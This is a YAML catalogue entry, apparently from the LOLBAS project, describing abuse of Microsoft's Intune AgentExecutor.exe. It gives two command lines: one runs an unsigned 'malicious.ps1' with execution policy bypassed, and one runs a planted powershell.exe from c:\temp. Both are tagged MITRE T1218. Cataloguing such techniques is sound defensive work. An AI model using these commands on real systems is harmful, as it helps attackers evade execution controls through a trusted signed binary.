---
Name: AgentExecutor.exe
Description: Intune Management Extension included on Intune Managed Devices
Author: 'Eleftherios Panos'
Created: 2020-07-23
Commands:
  - Command: AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1
    Description: Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument
    Usecase: Execute unsigned powershell scripts
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 10
  - Command: AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\temp\" 0 1
    Description: If we place a binary named powershell.exe in the path c:\temp, agentexecutor.exe will execute it successfully
    Usecase: Execute a provided EXE
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 10
Full_Path:
  - Path: C:\Program Files (x86)\Microsoft Intune Management Extension
Code_Sample:
  - Code:
Detection:
Resources:
  - Link:
Acknowledgement:
  - Person: Eleftherios Panos
    Handle: '@lefterispan'
---
